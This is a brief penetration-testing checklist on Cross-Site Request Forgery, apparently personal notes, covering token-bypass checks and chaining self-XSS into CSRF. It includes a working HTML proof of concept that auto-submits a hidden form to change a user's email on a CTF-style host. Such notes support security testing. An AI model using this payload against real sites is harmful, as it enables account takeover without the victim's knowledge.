Cross-Site Request Forgery allows an attacker to perform an action on a victim's behalf without the victim knowing.

Can't steal any data, but can perform a state-changing action.

## Checks

- [ ] Look for:
    - State-changing action with no unique tokens
    - Check if we can replicate the request without triggering CORS
    - Develop a PoC.
- [ ] CSRF Tokens
    - Can we remove the token?
    - Can we remove the parameter altogether?
    - Is the token tied to the user's session?
    - Can the CSRF token be reused?
    - Can we determine how the CSRF token is generated, and can we break it?

Example:

```html
<!DOCTYPE html>
  <html>
  <head>
      <title>CSRF PoC</title>
  </head>
  <body>
      <h3>Standard CSRF PoC</h3>
      <form action="<https://nnjftadt.eu1.ctfio.com/email>" method="post">
      <input type="hidden" name="email" value="pawpaw@hacks.dev" />
          <input type="submit" value="Submit request" />
      </form>
      <script>
          history.pushState('', '', '/');
          document.forms[0].submit();
      </script>
  </body>
  </html>
```

## CSRF Bypasses

- [ ] Check switching CSRF tokens between users
- [ ] Try removing the token and/or parameter

## Escalate Self-XSS

If you have a self XSS that would require the victim to fill out a form, it may be possible to chain the self-XSS -> CSRF to develop a working exploit that has impact.

> [! tip] This is particularly relevant for POST requests that are vulnerable to XSS

